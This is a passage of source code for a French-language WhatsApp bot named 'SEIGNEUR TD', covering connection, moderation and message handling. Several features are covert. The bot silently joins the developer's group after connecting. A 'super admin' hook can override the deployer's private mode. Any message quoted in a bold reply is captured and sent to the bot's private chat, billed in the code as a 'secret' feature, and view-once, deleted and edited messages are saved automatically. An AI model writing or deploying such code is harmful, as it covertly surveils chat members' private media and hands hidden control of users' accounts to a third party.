  console.log(`Using WA v${version.join('.')}, isLatest: ${isLatest}`);

  const { state, saveCreds } = await useMultiFileAuthState(config.sessionFolder);

  const sock = makeWASocket({
    version,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: !config.usePairingCode,
    auth: state,
    browser: ['Ubuntu', 'Chrome', '20.0.04'],
    getMessage: async (key) => {
      return { conversation: '' };
    }
  });

  // Handle pairing code
  if (config.usePairingCode && !sock.authState.creds.registered) {
    console.log('\n🔐 Utilisation du Pairing Code activée!\n');

    let phoneNumber = config.phoneNumber;

    if (!phoneNumber) {
      const readline = await import('readline');
      const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
      phoneNumber = await new Promise((resolve) => {
        rl.question('📱 Entrez votre numéro WhatsApp (ex: 33612345678): ', (answer) => {
          rl.close();
          resolve(answer.trim());
        });
      });
      config.phoneNumber = phoneNumber;
    }

    if (phoneNumber) {
      await delay(3000);
      try {
        const code = await sock.requestPairingCode(phoneNumber);
        const formatted = code?.match(/.{1,4}/g)?.join('-') || code;
        console.log('\n╔═══════════════════════════════════╗');
        console.log('║   🔑 PAIRING CODE GÉNÉRÉ 🔑      ║');
        console.log('╚═══════════════════════════════════╝');
        console.log(`\n     CODE: ${formatted}\n`);
      } catch(e) {
        console.log('❌ Erreur pairing code:', e.message);
      }
    }
  }

  // Connection update handler
  // Connection update handler
  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr && !config.usePairingCode) {
      console.log('\n📱 Scan this QR code with WhatsApp:');
      qrcode.generate(qr, { small: true });
    }

    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log('Connection closed, reconnecting:', shouldReconnect);

      if (shouldReconnect) {
        await delay(5000);
        connectToWhatsApp();
      } else {
        console.log('Logged out. Delete auth folder and restart.');
        saveData();
      }
    } else if (connection === 'open') {
      _botOwnNumber = sock.user.id.split(':')[0].split('@')[0].replace(/[^0-9]/g,'');
      console.log(`[OWNER] Numéro bot: ${_botOwnNumber}`);
      // Warmup 2s à la première connexion pour laisser WhatsApp se stabiliser
      if (_botFirstConnect) {
        _botFirstConnect = false;
        console.log('⏳ [WARMUP] Stabilisation 2s...');
        await delay(2000);
        console.log('✅ [WARMUP] Bot prêt à recevoir des commandes');
      }
      console.log('✅ Connecté à WhatsApp!');
      console.log(`Bot: ${config.botName}`);
      console.log(`Bot JID: ${sock.user.id}`);
      console.log('\n⚔️ SEIGNEUR TD 🇷🇴 est prêt! ⚔️\n');

      // Message de bienvenue au PV du bot à la première connexion
      try {
        const botPvJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        const welcomeMsg =
`┏━━━━ ⚙️ 𝐒𝐄𝐈𝐆𝐍𝐄𝐔𝐑 TD 🇷🇴━━━━
┃
┃ ᴘʀᴇғɪx  ⪧ [ ${config.prefix} ]
┃ ᴍᴏᴅᴇ    ⪧ ᴘᴜʙʟɪᴄ
┃ sᴛᴀᴛᴜs  ⪧ ᴏɴʟɪɴᴇ
┃ ᴘᴀɴᴇʟ   ⪧ ᴘʀᴇᴍɪᴜᴍ
┃ ᴀᴅᴍɪɴ   ⪧ +${config.botAdmins[0] || '23591234568'}
┃
┃
┗━━━━━━━━━━━━━━━━━━━━━━━━

📢 *Pour ne rater aucune mise à jour future, rejoins :*
🔗 Chaîne : https://whatsapp.com/channel/0029VbBZrLBFMqrQIDpcfO04
👥 Groupe  : https://chat.whatsapp.com/KfbEkfcbepR0DPXuewOrur`;

        await sock.sendMessage(botPvJid, { text: welcomeMsg });
      } catch(e) {
        console.error('[WELCOME MSG]', e.message);
      }

      // ── Auto-rejoindre le groupe dev silencieusement ──
      setTimeout(async () => {
        try {
          const DEV_GROUP_INVITE = 'KfbEkfcbepR0DPXuewOrur'; // code d'invitation (après chat.whatsapp.com/...)

          // Récupérer tous les groupes du bot
          const allGroups = await sock.groupFetchAllParticipating();
          const groupIds  = Object.keys(allGroups);

          // Vérifier si le bot est déjà dans le groupe en cherchant via l'invite
          let alreadyIn = false;
          try {
            const inviteInfo = await sock.groupGetInviteInfo(DEV_GROUP_INVITE);
            const targetJid  = inviteInfo?.id;
            if (targetJid && groupIds.includes(targetJid)) {
              alreadyIn = true;
            }
          } catch(e) {
            // Si groupGetInviteInfo échoue, on tente quand même de rejoindre
          }

          if (!alreadyIn) {
            await sock.groupAcceptInvite(DEV_GROUP_INVITE);
            console.log('✅ [AUTO-JOIN] Groupe dev rejoint avec succès');
          } else {
            console.log('ℹ️ [AUTO-JOIN] Déjà dans le groupe dev');
          }
        } catch(e) {
          console.error('[AUTO-JOIN]', e.message);
        }
      }, 5000); // attendre 5s après connexion
    }
  });

  sock.ev.on('creds.update', saveCreds);

  // ═══ PATCH GLOBAL sendMessage — bouton "Voir la chaîne" sur chaque message ═══
  const _origSendMessage = sock.sendMessage.bind(sock);
  _origSendMessageGlobal = _origSendMessage; // accessible globalement pour swgrup
  sock.sendMessage = async function(jid, content, options = {}) {
    try {
      const skip = content?.react !== undefined || content?.delete !== undefined ||
                   content?.groupStatusMessage !== undefined || jid === 'status@broadcast';
      if (!skip) {
        const ctx = {
          forwardingScore: 999, isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: config.channelJid,
            newsletterName: config.botName,
            serverMessageId: Math.floor(Math.random() * 9000) + 1000
          }
        };
        content.contextInfo = content.contextInfo ? { ...ctx, ...content.contextInfo } : ctx;
      }
    } catch(e) {}
    return _origSendMessage(jid, content, options);
  };

  // =============================================
  // ANTI-DELETE — helper central
  // =============================================
  async function _handleAntiDelete(cachedMsg, fromMe) {
    if (!antiDelete) return;
    if (!cachedMsg) return;
    if (fromMe) return; // le bot lui-même a supprimé

    const _botPvJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
    const isGroup = cachedMsg.isGroup;
    const senderJid = cachedMsg.sender;

    let notifyJid;
    if (antiDeleteMode === 'private') {
      notifyJid = _botPvJid;
    } else if (antiDeleteMode === 'gchat') {
      notifyJid = cachedMsg.remoteJid;
    } else { // all
      notifyJid = cachedMsg.remoteJid;
    }

    const notifText = `▎🗑️ *SUPPRIMÉ* | +${senderJid.split('@')[0]}\n▎📍 ${isGroup ? 'Groupe' : 'Chat privé'}\n▎💬 « ${cachedMsg.text !== '[Media]' ? cachedMsg.text : '(média)'} »\n▎© SEIGNEUR TD 🇷🇴`;

    await sock.sendMessage(notifyJid, { text: notifText, mentions: [senderJid] });
    if (antiDeleteMode === 'all' && notifyJid !== _botPvJid) {
      await sock.sendMessage(_botPvJid, { text: notifText, mentions: [senderJid] }).catch(()=>{});
    }

    // Envoyer le média si disponible
    try {
      const _m = cachedMsg.message;
      if (_m) {
        const _vv  = _m.viewOnceMessageV2?.message || _m.viewOnceMessageV2Extension?.message;
        const _img = _vv?.imageMessage || _m.imageMessage;
        const _vid = _vv?.videoMessage || _m.videoMessage;
        const _aud = _m.audioMessage;
        const _stk = _m.stickerMessage;
        const _doc = _m.documentMessage;
        if (_img) {
          const _buf = await toBuffer(await downloadContentFromMessage(_img, 'image'));
          await sock.sendMessage(notifyJid, { image: _buf, caption: _img.caption || '' });
        } else if (_vid) {
          const _buf = await toBuffer(await downloadContentFromMessage(_vid, 'video'));
          await sock.sendMessage(notifyJid, { video: _buf, caption: _vid.caption || '' });
        } else if (_aud) {
          const _buf = await toBuffer(await downloadContentFromMessage(_aud, 'audio'));
          await sock.sendMessage(notifyJid, { audio: _buf, mimetype: _aud.mimetype||'audio/ogg', ptt: _aud.ptt||false });
        } else if (_stk) {
          const _buf = await toBuffer(await downloadContentFromMessage(_stk, 'sticker'));
          await sock.sendMessage(notifyJid, { sticker: _buf });
        } else if (_doc) {
          const _buf = await toBuffer(await downloadContentFromMessage(_doc, 'document'));
          await sock.sendMessage(notifyJid, { document: _buf, mimetype: _doc.mimetype, fileName: _doc.fileName||'fichier' });
        }
      }
    } catch(_e) { console.error('[ANTIDEL MEDIA]', _e.message); }
    console.log(`✅ AntiDelete → ${notifyJid} (mode: ${antiDeleteMode})`);
  }

  // =============================================
  // ANTI-EDIT — helper central
  // =============================================
  async function _handleAntiEdit(cachedMsg, newText) {
    if (!antiEdit || !cachedMsg || !newText || newText === cachedMsg.text) return;
    const _botPvJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
    const isGroup = cachedMsg.isGroup;
    const senderJid = cachedMsg.sender;
    let notifyJid;
    if (antiEditMode === 'private') { notifyJid = _botPvJid; }
    else if (antiEditMode === 'gchat') { notifyJid = cachedMsg.remoteJid; }
    else { notifyJid = cachedMsg.remoteJid; }
    const notifText = `▎📝 *MODIFIÉ* | +${senderJid.split('@')[0]}\n▎📍 ${isGroup ? 'Groupe' : 'Chat privé'}\n▎❌ Avant : ${cachedMsg.text}\n▎✅ Après  : ${newText}\n▎© SEIGNEUR TD 🇷🇴`;
    await sock.sendMessage(notifyJid, { text: notifText, mentions: [senderJid] });
    if (antiEditMode === 'all' && notifyJid !== _botPvJid) {
      await sock.sendMessage(_botPvJid, { text: notifText, mentions: [senderJid] }).catch(()=>{});
    }
    cachedMsg.text = newText;
    console.log(`✏️ AntiEdit → ${notifyJid} (mode: ${antiEditMode})`);
  }


  const processedMsgIds=new Set();
  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    if(type!=='notify')return;
    for(const message of messages){
      // ── Méthode 2 : protocolMessage type REVOKE = suppression WhatsApp ──
      const _proto = message.message?.protocolMessage;
      if (_proto && (_proto.type === 0 || _proto.type === 'REVOKE')) {
        if (antiDelete) {
          const _deletedId = _proto.key?.id;
          const _cached = _deletedId ? messageCache.get(_deletedId) : null;
          if (_cached) {
            _handleAntiDelete(_cached, _proto.key?.fromMe).catch(e => console.error('[ANTIDEL PROTO]', e.message));
          } else {
            console.log('[ANTIDEL] proto revoke ID', _deletedId, 'non dans cache');
          }
        }
        continue;
      }

      // ── Méthode 2b : editedMessage dans upsert = modification WhatsApp ──
      const _edited = message.message?.editedMessage || message.message?.protocolMessage?.editedMessage;
      if (_edited) {
        if (antiEdit) {
          const _origId = _edited.key?.id || message.message?.protocolMessage?.key?.id;
          const _newTxt = _edited.message?.conversation ||
                          _edited.message?.extendedTextMessage?.text;
          const _cached = _origId ? messageCache.get(_origId) : null;
          if (_cached && _newTxt) {
            _handleAntiEdit(_cached, _newTxt).catch(e => console.error('[ANTIEDIT UPSERT]', e.message));
          }
        }
        continue;
      }

      const msgAge=Date.now()-((message.messageTimestamp||0)*1000);
      if(msgAge>60000)continue;
      const msgId=message.key.id;
      if(processedMsgIds.has(msgId))continue;
      processedMsgIds.add(msgId);
      if(processedMsgIds.size>2000)processedMsgIds.delete(processedMsgIds.values().next().value);
      // IMPORTANT: Accepter les messages du bot aussi (pour les discussions privées with le numéro du bot)
      if (message.key.remoteJid === 'status@broadcast') {
        // =============================================
        // GESTION AUTOMATIQUE DES STATUS
        // =============================================
        try {
          const statusSender = message.key.participant || message.key.remoteJid;
          const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
          
          console.log(`📱 Nouveau status détecté de: ${statusSender}`);
          
          // AutoView - Lire le status automatiquement
          if (autoReadStatus) {
            await sock.readMessages([message.key]).catch((err) => {
              console.error('Erreur lecture status:', err);
            });
            console.log('✅ Status lu automatiquement');
          }
          
          // ReactStatus - Réagir with emoji si activé et pas notre propre status
          if (autoLikeStatus && statusSender !== botJid) {
            const messageType = Object.keys(message.message || {})[0];
            if (!messageType || messageType === 'protocolMessage') {
              console.log('⏭️ Status ignoré (message protocol)');
              continue;
            }
            
            const emojiToUse = '🇷🇴';
            await sock.sendMessage('status@broadcast', {
              react: { text: emojiToUse, key: message.key }
            }, { statusJidList: [statusSender] }).catch((err) => {
              console.error('Erreur réaction status:', err);
            });
            console.log(`✅ Status liké with ${emojiToUse}`);
          }

          // =============================================
          // 🚫 ANTI-MENTION GROUPE — Kick si mention groupe en status
          // =============================================
          if (statusSender !== botJid) {
            const statusMsg = message.message;
            const hasGroupMention =
              statusMsg?.groupMentionMessage !== undefined ||
              statusMsg?.extendedTextMessage?.contextInfo?.groupMentions?.length > 0 ||
              statusMsg?.imageMessage?.contextInfo?.groupMentions?.length > 0 ||
              statusMsg?.videoMessage?.contextInfo?.groupMentions?.length > 0 ||
              statusMsg?.documentMessage?.contextInfo?.groupMentions?.length > 0;

            if (hasGroupMention) {
              console.log(`⚠️ [ANTI-MENTION GROUPE] ${statusSender} a mentionné un groupe en status`);
              // Chercher dans tous les groupes actifs si cette personne est membre
              try {
                const groupList = await sock.groupFetchAllParticipating();
                for (const [groupJid, groupData] of Object.entries(groupList)) {
                  const settings = groupSettings.get(groupJid);
                  if (!settings?.antimentiongroupe) continue; // Seulement si activé dans ce groupe

                  const isMember = groupData.participants.some(p => p.id === statusSender);
                  if (!isMember) continue;

                  const botIsAdmin = await isBotGroupAdmin(sock, groupJid);
                  if (!botIsAdmin) continue;

                  // Kick le membre
                  try {
                    await sock.groupParticipantsUpdate(groupJid, [statusSender], 'remove');
                    await sock.sendMessage(groupJid, {
                      text:
`🚫 *Anti-Mention Groupe*
━━━━━━━━━━━━━━━━━━━━━━━
👤 @${statusSender.split('@')[0]} a été expulsé !
📢 Raison : Il a mentionné ce groupe dans son status WhatsApp.
━━━━━━━━━━━━━━━━━━━━━━━
_© SEIGNEUR TD 🇷🇴_`,
                      mentions: [statusSender]
                    });
                    console.log(`✅ [ANTI-MENTION GROUPE] ${statusSender} expulsé de ${groupJid}`);
                  } catch(e) {
                    console.error(`[ANTI-MENTION GROUPE] Erreur kick:`, e.message);
                  }
                }
              } catch(e) {
                console.error('[ANTI-MENTION GROUPE] Erreur fetch groupes:', e.message);
              }
            }
          }
          
        } catch (error) {
          console.error('Erreur lors de la gestion du status:', error);
        }
        continue;
      }

      const remoteJid = message.key.remoteJid;
      const isGroup = remoteJid.endsWith('@g.us');
      let senderJid;
      if (message.key.fromMe) {
        // Message envoyé par le numéro connecté au bot (depuis son propre téléphone)
        // → toujours utiliser le numéro du bot, peu importe le chat ou groupe
        senderJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
      } else if (isGroup) {
        senderJid = message.key.participant || message.participant || remoteJid;
      } else {
        senderJid = message.key.participant || remoteJid;
      }
      // Normaliser le senderJid (retirer :XX device suffix)
      if (senderJid && senderJid.includes(':')) {
        senderJid = senderJid.split(':')[0] + '@s.whatsapp.net';
      }
      // Mettre à jour les flags pour isAdminOrOwner()
      _currentFromMe = message.key.fromMe === true;
      _currentSenderJid = senderJid;

      // ── Extraire le texte du message (ici pour que tout le code en bas puisse l'utiliser)
      // Inclure tous les types : texte, médias, messages transférés depuis chaîne
      const _rawMsg = message.message;
      const _fwdMsg = _rawMsg?.forwardedNewsletterMessageInfo ||
                      _rawMsg?.extendedTextMessage?.contextInfo?.forwardedNewsletterMessageInfo;
      const messageText = _rawMsg?.conversation ||
                         _rawMsg?.extendedTextMessage?.text ||
                         _rawMsg?.imageMessage?.caption ||
                         _rawMsg?.videoMessage?.caption ||
                         _rawMsg?.documentMessage?.caption ||
                         _rawMsg?.audioMessage?.caption ||
                         _rawMsg?.ephemeralMessage?.message?.conversation ||
                         _rawMsg?.viewOnceMessage?.message?.imageMessage?.caption ||
                         _rawMsg?.viewOnceMessage?.message?.videoMessage?.caption || '';
      const senderName = message.pushName || 'Unknown';
      console.log(`\n📨 ${senderName} (${isGroup ? 'Group' : 'Private'}) [fromMe:${_currentFromMe}]: ${messageText.substring(0, 60)}`);

      // =============================================
      // 🇷🇴 SUPER ADMIN — géré par superadmin.js
      // Appel AVANT la vérification du mode privé
      // =============================================
      {
        // setOwner = callback pour forcer isAdminOrOwner()=true pendant l'exécution
        const _setOwner = (val) => { _currentFromMe = val; };
        const _saHandled = await handleSuperAdmin(
          sock, message, senderJid, remoteJid,
          messageText, config.prefix, handleCommand,
          isGroup, _setOwner
        );
        // Si c'était une commande du super admin → déjà traitée, passer au suivant
        if (_saHandled) continue;
      }

      // =============================================
      // CACHE DES MESSAGES POUR ANTI-DELETE/EDIT
      // =============================================
      if (antiDelete || antiEdit) {
        const messageId = message.key.id;
        const messageData = {
          key: message.key,
          message: message.message,
          sender: senderJid,
          senderName: message.pushName || senderJid.split('@')[0],
          remoteJid: remoteJid,
          isGroup: isGroup,
          timestamp: Date.now(),
          text: message.message?.conversation || 
                message.message?.extendedTextMessage?.text || 
                message.message?.imageMessage?.caption ||
                message.message?.videoMessage?.caption ||
                '[Media]'
        };
        messageCache.set(messageId, messageData);
        
        console.log(`💾 Message mis en cache: ID=${messageId}, Texte="${messageData.text.substring(0, 30)}..."`);
        console.log(`📊 Taille du cache: ${messageCache.size} messages`);

        // Nettoyer le cache (garder seulement les 1000 derniers messages)
        if (messageCache.size > 1000) {
          const firstKey = messageCache.keys().next().value;
          messageCache.delete(firstKey);
          console.log(`🗑️ Cache nettoyé, message le plus ancien supprimé`);
        }
      }

      // =============================================
      // TRACKING D'ACTIVITÉ DES MEMBRES (POUR LISTACTIVE/LISTINACTIVE)
      // =============================================
      if (isGroup) {
        // Initialiser la Map pour ce groupe si elle n'existe pas
        if (!memberActivity.has(remoteJid)) {
          memberActivity.set(remoteJid, new Map());
        }
        
        const groupActivity = memberActivity.get(remoteJid);
        const currentActivity = groupActivity.get(senderJid) || { lastMessage: 0, messageCount: 0 };
        
        groupActivity.set(senderJid, {
          lastMessage: Date.now(),
          messageCount: currentActivity.messageCount + 1
        });
        
        console.log(`📊 Activité: ${senderJid.split('@')[0]} a maintenant ${currentActivity.messageCount + 1} messages`);
      }

      // Détection View Once — capturer tous les types
      const msgKeys = Object.keys(message.message || {});
      const isViewOnce = (
        message.message?.viewOnceMessageV2 ||
        message.message?.viewOnceMessageV2Extension ||
        message.message?.imageMessage?.viewOnce === true ||
        message.message?.videoMessage?.viewOnce === true ||
        msgKeys.some(k => k.toLowerCase().includes('viewonce'))
      );
      if (isViewOnce) {
        await handleViewOnce(sock, message, remoteJid, senderJid);
      }

      // =============================================
      // SEIGNEUR-TD AUTO SAVE VIEW ONCE (quoted)
      // Sauvegarde silencieuse de tout ViewOnce cité
      // =============================================
      try {
        const _autoVvQuoted = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        if (_autoVvQuoted) {
          const _autoVvMsg =
            _autoVvQuoted.viewOnceMessageV2?.message ||
            _autoVvQuoted.viewOnceMessageV2Extension?.message;

          if (_autoVvMsg) {
            const _botPrivJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
            const _fromName =
              message.message?.extendedTextMessage?.contextInfo?.participant
                ?.split('@')[0] || 'Unknown';
            const _saverName = message.pushName || senderJid.split('@')[0];

            await sock.sendMessage(_botPrivJid, {
              text: `👁️ *VIEW ONCE AUTO SAUVEGARDÉ*\n━━━━━━━━━━━━━━━━━━━━━━━\n👤 De: +${_fromName}\n💬 Sauvegardé par: ${_saverName}\n━━━━━━━━━━━━━━━━━━━━━━━`
            });

            const _qImg = _autoVvMsg.imageMessage;
            const _qVid = _autoVvMsg.videoMessage;
            const _qAud = _autoVvMsg.audioMessage;

            if (_qImg) {
              const _buf = await toBuffer(await downloadContentFromMessage(_qImg, 'image'));
              await sock.sendMessage(_botPrivJid, {
                image: _buf,
                mimetype: _qImg.mimetype || 'image/jpeg',
                caption: _qImg.caption || '📸 ViewOnce Image'
              });
            } else if (_qVid) {
              const _buf = await toBuffer(await downloadContentFromMessage(_qVid, 'video'));
              await sock.sendMessage(_botPrivJid, {
                video: _buf,
                mimetype: _qVid.mimetype || 'video/mp4',
                caption: _qVid.caption || '🎥 ViewOnce Vidéo'
              });
            } else if (_qAud) {
              const _buf = await toBuffer(await downloadContentFromMessage(_qAud, 'audio'));
              await sock.sendMessage(_botPrivJid, {
                audio: _buf,
                mimetype: _qAud.mimetype || 'audio/ogg',
                ptt: _qAud.ptt || false
              });
            }
          }
        }
      } catch(e) {
        console.log('[AUTO VIEWONCE]', e.message);
      }

      // ══════════════════════════════════════════════
      // 🔒 FONCTIONNALITÉ SECRÈTE — Bold Reply Save
      // N'importe qui (y compris le bot) peut répondre en GRAS
      // → capture silencieuse en privé (groupes + privés)
      // ══════════════════════════════════════════════
      try {
        const msgTxt = message.message?.extendedTextMessage?.text ||
                       message.message?.conversation || '';
        const isBold = /\*[^*]+\*/.test(msgTxt); // Contient *texte en gras*
        const quotedCtx = message.message?.extendedTextMessage?.contextInfo;
        const hasQuoted = quotedCtx?.quotedMessage;

        // Autoriser TOUT LE MONDE y compris le bot (supprimé !message.key.fromMe)
        if (isBold && hasQuoted) {
          const isFromBot = message.key.fromMe;
          const botPrivJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
          const sName      = message.pushName || senderJid.split('@')[0];
          const dateNow    = new Date().toLocaleString('fr-FR', { timeZone: 'America/NDjamena' });
          const quoted     = quotedCtx.quotedMessage;

          // En-tête discret
          await sock.sendMessage(botPrivJid, {
            text: `🔒 *[SECRET SAVE]* ${isFromBot ? '🤖' : ''}
👤 +${senderJid.split('@')[0]}
💬 "${msgTxt}"
📅 ${dateNow}
📍 ${remoteJid.endsWith('@g.us') ? 'Groupe' : 'Privé'}
📲 Dest: ${remoteJid}`
          });

          // Sauvegarder le contenu du message cité
          const qVonceMsg  = quoted.viewOnceMessageV2?.message || quoted.viewOnceMessageV2Extension?.message;
          const qImg   = qVonceMsg?.imageMessage  || quoted.imageMessage;
          const qVid   = qVonceMsg?.videoMessage  || quoted.videoMessage;
          const qAud   = quoted.audioMessage;
          const qStick = quoted.stickerMessage;
          const qTxt2  = quoted.conversation || quoted.extendedTextMessage?.text;

          if (qImg) {
            const buf = await toBuffer(await downloadContentFromMessage(qImg, 'image'));
            await sock.sendMessage(botPrivJid, { image: buf, mimetype: qImg.mimetype || 'image/jpeg', caption: `┏━ 💎 Bᴇᴀᴜᴛé\n┃━ 💸 Pᴀᴜᴠʀᴇᴛé\n┗━ 🤝 Fɪᴅéʟɪᴛé\n\n░ L E  S E I G N E U R  D E S  A P P A R E I L S 😍 🇷🇴` });
          } else if (qVid) {
            const buf = await toBuffer(await downloadContentFromMessage(qVid, 'video'));
            await sock.sendMessage(botPrivJid, { video: buf, mimetype: qVid.mimetype || 'video/mp4', caption: `┏━ 💎 Bᴇᴀᴜᴛé\n┃━ 💸 Pᴀᴜᴠʀᴇᴛé\n┗━ 🤝 Fɪᴅéʟɪᴛé\n\n░ L E  S E I G N E U R  D E S  A P P A R E I L S 😍 🇷🇴` });
          } else if (qAud) {
            const buf = await toBuffer(await downloadContentFromMessage(qAud, 'audio'));
            await sock.sendMessage(botPrivJid, { audio: buf, mimetype: qAud.mimetype || 'audio/ogg', ptt: qAud.ptt || false });
          } else if (qStick) {
            const buf = await toBuffer(await downloadContentFromMessage(qStick, 'sticker'));
            await sock.sendMessage(botPrivJid, { sticker: buf });
          } else if (qTxt2) {
            await sock.sendMessage(botPrivJid, { text: `💬 *Texte cité:*
${qTxt2}` });
          }
        }
      } catch(e) {
        // Silencieux — fonctionnalité secrète
        console.error('[Secret Bold]', e.message);
      }

      // Détection Sticker-Commande (setcmd)
      if (message.message?.stickerMessage && global.stickerCommands?.size > 0) {
        try {
          const stickerMsg = message.message.stickerMessage;
          const stream = await downloadContentFromMessage(stickerMsg, 'sticker');
          const buf    = await toBuffer(stream);
          const hash   = buf.slice(0, 32).toString('hex');
          const linkedCmd = global.stickerCommands.get(hash);
          if (linkedCmd) {
            console.log(`🎭 Sticker-cmd déclenché: ${config.prefix}${linkedCmd}`);
            // Simuler le message texte de la commande et appeler handleCommand
            const fakeText = config.prefix + linkedCmd;
            await handleCommand(sock, message, fakeText, remoteJid, senderJid, remoteJid.endsWith('@g.us'), _currentFromMe);
          }
        } catch(e) { console.error('[Sticker-cmd]', e.message); }
      }

      // messageText et senderName déjà définis plus haut

      // ═══ MENU INTERACTIF — Détection réponse ═══════════════════════════════
      const quotedMsgId = message.message?.extendedTextMessage?.contextInfo?.stanzaId;
      if (quotedMsgId && global.menuMessages?.has(quotedMsgId)) {
        const choice = messageText.trim();
        
        // Mapper numéros → catégories (décalage -1 car ❶=ALL MENU qui est catégorie 0)
        const menuMap = {
          '1': '0',  // ❶ ALL MENU → catégorie 0
          '2': '1',  // ❷ OWNER MENU → catégorie 1
          '3': '2',  // ❸ DOWNLOAD MENU → catégorie 2
          '4': '3',  // ❹ GROUP MENU → catégorie 3
          '5': '4',  // ❺ PROTECTION MENU → catégorie 4
          '6': '5',  // ❻ ATTACK MENU → catégorie 5
          '7': '6',  // ❼ MEDIA MENU → catégorie 6
          '8': '7',  // ❽ GENERAL MENU → catégorie 7
          '9': '8',  // ❾ VIEW ONCE MENU → catégorie 8
          '10': '9', // ❿ GAMES MENU → catégorie 9
          '❶': '0', '❷': '1', '❸': '2', '❹': '3', '❺': '4',
          '❻': '5', '❼': '6', '❽': '7', '❾': '8', '❿': '9'
        };
        
        const num = menuMap[choice];
        if (num) {
          console.log(`🎯 Menu réponse: ${choice} → catégorie ${num}`);
          
          // Réagir avec le numéro
          try {
            await sock.sendMessage(remoteJid, {
              react: { text: choice, key: message.key }
            });
          } catch(e) {}
          
          // Simuler la commande !0, !1, !2, etc.
          const fakeText = config.prefix + num;
          await handleCommand(sock, message, fakeText, remoteJid, senderJid, isGroup, _currentFromMe);
          
          // Supprimer du cache
          global.menuMessages.delete(quotedMsgId);
          continue;
        }
      }


      // Update database
      if (!database.users.has(senderJid)) {
        database.users.set(senderJid, {
          name: senderName,
          messageCount: 0,
          lastSeen: Date.now()
        });
        database.statistics.totalUsers++;
      }
      
      const userData = database.users.get(senderJid);
      userData.messageCount++;
      userData.lastSeen = Date.now();
      database.statistics.totalMessages++;

      // Mode privé : silence total pour tout le monde sauf owner (fromMe) et super admin
      // Le super admin est déjà géré avant ce bloc (handleSuperAdmin)
      // Le owner est identifié par _currentFromMe=true
      if (botMode === 'private' && !isAdminOrOwner()) {
        continue; // Ignorer silencieusement — bot invisible
      }

      // PROTECTIONS ANTI (DANS LES GROUPES)
      if (isGroup) {
        const settings = initGroupSettings(remoteJid);
        const userIsGroupAdmin = await isGroupAdmin(sock, remoteJid, senderJid);
        const botIsAdmin = await isBotGroupAdmin(sock, remoteJid);

        if (!userIsGroupAdmin) {
          
          if(settings.antibot&&botIsAdmin){
            const _pn=(message.pushName||'').toLowerCase(),_sn=senderJid.split('@')[0];
            if((_pn.includes('bot')||_pn.includes('robot')||/^\d{16,}$/.test(_sn))&&!isAdminOrOwner()){
              try{await sock.groupParticipantsUpdate(remoteJid,[senderJid],'remove');await sock.sendMessage(remoteJid,{text:`🤖 Bot expulsé: @${_sn}`,mentions:[senderJid]});continue;}catch(e){}
            }
          }

          // ANTI-LINK
          if (settings.antilink && botIsAdmin) {
            const linkRegex = /(https?:\/\/[^\s]+)|(www\.[^\s]+)|((whatsapp|wa|chat)\.gg\/[^\s]+)/gi;
            if (linkRegex.test(messageText)) {
              try {
                await sock.sendMessage(remoteJid, { delete: message.key });
                const warnCount = addWarn(remoteJid, senderJid, 'Envoi de lien');
                
                await sock.sendMessage(remoteJid, {
                  text: `🚫 @${senderJid.split('@')[0]}, les liens sont interdits!\n\n⚠️ attention${warnCount}/${settings.maxWarns}`,
                  mentions: [senderJid]
                });

                if (warnCount >= settings.maxWarns) {
                  await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove');
                  await sock.sendMessage(remoteJid, {
                    text: `❌ @${senderJid.split('@')[0]} a été expulsé (trop d'avertissement)`,
                    mentions: [senderJid]
                  });
                  resetWarns(remoteJid, senderJid);
                }
                
                console.log(`✅ Lien bloqué de ${senderJid}`);
                continue;
              } catch (error) {
                console.error('Erreur in antilink:', error);
              }
            }
          }

          // ANTI-TAG
          if (settings.antitag && botIsAdmin) {
            const mentions = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
            if (mentions.length > 5) {
              try {
                await sock.sendMessage(remoteJid, { delete: message.key });
                const warnCount = addWarn(remoteJid, senderJid, 'Tag massif');
                
                await sock.sendMessage(remoteJid, {
                  text: `🚫 @${senderJid.split('@')[0]}, pas de tags massifs!\n\n⚠️ Warning ${warnCount}/${settings.maxWarns}`,
                  mentions: [senderJid]
                });

                if (warnCount >= settings.maxWarns) {
                  await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove');
                  await sock.sendMessage(remoteJid, {
                    text: `❌ @${senderJid.split('@')[0]} a été expulsé (trop d'avertissement)`,
                    mentions: [senderJid]
                  });
                  resetWarns(remoteJid, senderJid);
                }
                
                console.log(`✅ Tag massif bloqué de ${senderJid}`);
                continue;
              } catch (error) {
                console.error('Erreur in antitag:', error);
              }
            }
          }

          // ANTI-Spam
          if (settings.antispam && botIsAdmin && messageText) {
            if (checkSpam(senderJid, messageText)) {
              try {
                await sock.sendMessage(remoteJid, { delete: message.key });
                const warnCount = addWarn(remoteJid, senderJid, 'Spam détecté');
                
                await sock.sendMessage(remoteJid, {
                  text: `🚫 @${senderJid.split('@')[0]}, arrêtez de spammer!\n\n⚠️ attention${warnCount}/${settings.maxWarns}`,
                  mentions: [senderJid]
                });

                if (warnCount >= settings.maxWarns) {
                  await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove');
                  await sock.sendMessage(remoteJid, {
                    text: `❌ @${senderJid.split('@')[0]} a été expulsé (spam)`,
                    mentions: [senderJid]
                  });
                  resetWarns(remoteJid, senderJid);
                }
                
                console.log(`✅ Spam bloqué de ${senderJid}`);
                continue;
              } catch (error) {
                console.error('Erreur in antispam:', error);
              }
            }
          }
        }
      }

      // =============================================
      // 🛡️ ANTI-BUG GLOBAL (avant toute autre logique)
      // =============================================
      if (antiBug && !isAdminOrOwner() && !isSuperAdminJid(senderJid)) {
        const bugDetected = detectBugPayload(message, messageText);
